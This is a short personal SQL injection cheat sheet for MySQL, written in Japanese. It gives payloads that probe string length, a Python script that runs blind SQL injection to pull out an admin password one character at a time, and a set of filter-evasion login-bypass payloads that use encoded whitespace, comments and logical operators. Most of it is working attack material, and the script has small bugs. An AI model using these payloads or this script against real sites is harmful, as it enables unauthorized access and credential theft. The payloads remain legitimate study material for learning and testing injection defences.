# SQL Injection my cheet sheet

## Mysql

### 文字列の長さを調べる

```
?id=' and length(str)=8 -- -
```

これでログインが成功したときのページ繊維などが起きれば文字列の長さが8文字とわかる

### bind SQL Injection

`id`と`pass`というparamが存在し、passを求める場合

例

```python
import requests
url = ''
str_length = 1 # 取得する文字列の長さ
for index in range(1, str_length):
    for char_number in range(48, 123):
        char = chr(char_number)
        sql = 'admin\' AND SUBSTR((SELECT pass FROM user WHERE id = \'admin\'), {index}, 1) = \'{char}\' --'.format(index = index, char = char)
        payload = {
            'id' : sql,
            'pass' : ''
        }
        response = requests.post(url, data=payload)
        if len(response.text) > 2000: # 成功時にresponseの長さが変わる場合に有効
        # if len(response.txt).find('成功時に表示される文字列') != -1:
            print(char, end="")
            break
print()
```

### escape回避

* CR(Carriage Return) `%0d`で空白を挿入できる

```
?id='%0dor%0d'1'='1'--
```
> ?id=' or '1'='1'--

* LF(Line Feed) `%0a`で空白を挿入できる

```
?id='%0aor%0a'1'='1' #
```

> ?id=' or '1'='1'--

* Tab `0x09`でtabを挿入できる

```
?id='%09or%09'1'='1' #
```

> ?id=' or  '1'='1'--

* comment `/**/`でコメントを挿入すると空白なしで通る

```
?id='/**/or/**/'1'='1' #
```

> ?id='/* * /or/ * */'1'='1'--

* 論理演算子`||`, `&&`

```
?id=' || '1'='1' #
?id=' || '1'='1' && id = 'admin' #
```
